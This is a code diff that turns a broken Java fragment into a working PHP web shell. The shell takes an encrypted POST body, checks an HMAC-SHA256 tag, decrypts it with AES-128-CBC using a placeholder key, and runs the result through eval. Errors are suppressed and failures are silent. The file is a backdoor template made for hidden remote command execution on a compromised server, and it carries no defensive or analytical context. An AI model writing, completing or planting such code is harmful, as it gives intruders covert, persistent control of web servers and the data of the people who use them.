@@ -1,46 +1,52 @@
 <?php
+@session_start();
 @error_reporting(0);
-private byte[] Decrypt(byte[] data) throws Exception
-{
-    int prefixLen = 68;
-    byte[] encrypted = new byte[data.length - prefixLen];
-    System.arraycopy(data, prefixLen, encrypted, 0, encrypted.length);
-    String key = "__KEY__";
-    byte[] raw = key.getBytes("UTF-8");
-    
-    byte[] aesKey = new byte[16];
-    for (int i = 0; i < 16; i++) {
-        aesKey[i] = (byte) (raw[i % raw.length] ^ 0x1F);
+@ini_set('display_errors', '0');
+
+function Decrypt($data) {
+    $prefixLen = 68;
+    if (strlen($data) <= $prefixLen + 48) {
+        return "";
     }
     
-    javax.crypto.spec.SecretKeySpec sk = new javax.crypto.spec.SecretKeySpec(aesKey, "AES");
+    $encrypted = substr($data, $prefixLen);
     
-    byte[] iv = new byte[16];
-    System.arraycopy(encrypted, 0, iv, 0, 16);
+    $key = "__KEY__";
+    $raw = unpack('C*', $key);
+    $raw = $raw ? array_values($raw) : [];
+    $rawLen = count($raw);
+    if ($rawLen === 0) return "";
     
-    byte[] tag = new byte[32];
-    System.arraycopy(encrypted, encrypted.length - 32, tag, 0, 32);
-    
-    byte[] body = new byte[encrypted.length - 48];
-    System.arraycopy(encrypted, 16, body, 0, body.length);
-    
-    javax.crypto.Mac mac = javax.crypto.Mac.getInstance("HmacSHA256");
-    mac.init(sk);
-    
-    java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
-    out.write(iv);
-    out.write(body);
-    byte[] check = mac.doFinal(out.toByteArray());
-    
-    if (!java.security.MessageDigest.isEqual(check, tag))
-    {
-        throw new Exception("bad mac");
+    $aesKey = "";
+    for ($i = 0; $i < 16; $i++) {
+        $aesKey .= chr($raw[$i % $rawLen] ^ 0x1F);
     }
     
-    javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance("AES/CBC/PKCS5Padding");
-    cipher.init(javax.crypto.Cipher.DECRYPT_MODE, sk, new javax.crypto.spec.IvParameterSpec(iv));
-    return cipher.doFinal(body);
+    $iv = substr($encrypted, 0, 16);
+    $tag = substr($encrypted, -32);
+    $body = substr($encrypted, 16, -32);
+    
+    $macData = $iv . $body;
+    $check = hash_hmac('sha256', $macData, $aesKey, true);
+    
+    if ($check !== $tag) {
+        header("HTTP/1.1 500 Internal Server Error");
+        exit();
+    }
+    
+    return openssl_decrypt($body, 'AES-128-CBC', $aesKey, OPENSSL_RAW_DATA, $iv);
 }
-$post=Decrypt(file_get_contents("php://input"));
-@eval($post);
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $postData = file_get_contents("php://input");
+    if (!empty($postData)) {
+        $deMsg = Decrypt($postData);
+        if (!empty($deMsg)) {
+            try {
+                @eval($deMsg);
+            } catch (\Throwable $e) {
+            }
+        }
+    }
+}
 ?>
